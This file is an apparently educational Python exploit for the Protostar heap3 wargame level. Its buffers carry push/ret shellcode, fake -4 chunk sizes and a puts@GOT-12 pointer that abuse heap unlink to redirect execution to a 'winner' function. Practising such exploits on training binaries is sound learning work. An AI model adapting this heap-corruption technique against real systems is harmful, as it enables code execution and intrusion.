# TODO:
#	realize one more time, how it works lol :D

# winner func address - 0x08048864
#
# push 0x08048864		----->	"\x68\x64\x88\x04\x08\xc3"
# ret					----->

# https://airman604.medium.com/protostar-heap-3-walkthrough-56d9334bcd13

import struct

buf1 = ''
buf1 += 'AAAA' 			# junk

buf2 = ''
buf2 += 'A' * 16
buf2 += '\x68\x64\x88\x04\x08\xc3' # shellcode
buf2 += 'A' * (32 - len(buf2))
#overwrite prev_size and size of the last chunk with -4
buf2 += struct.pack("I", 0xfffffffc) * 2

buf3 = ''
buf3 += 'A' * 4			# junk
buf3 += struct.pack("I", 0x0804b128 - 12) # puts@GOT-12
buf3 += struct.pack("I", 0x0804c040) 	  # address of the shellcode

print buf1 + ' ' + buf2 + ' ' + buf3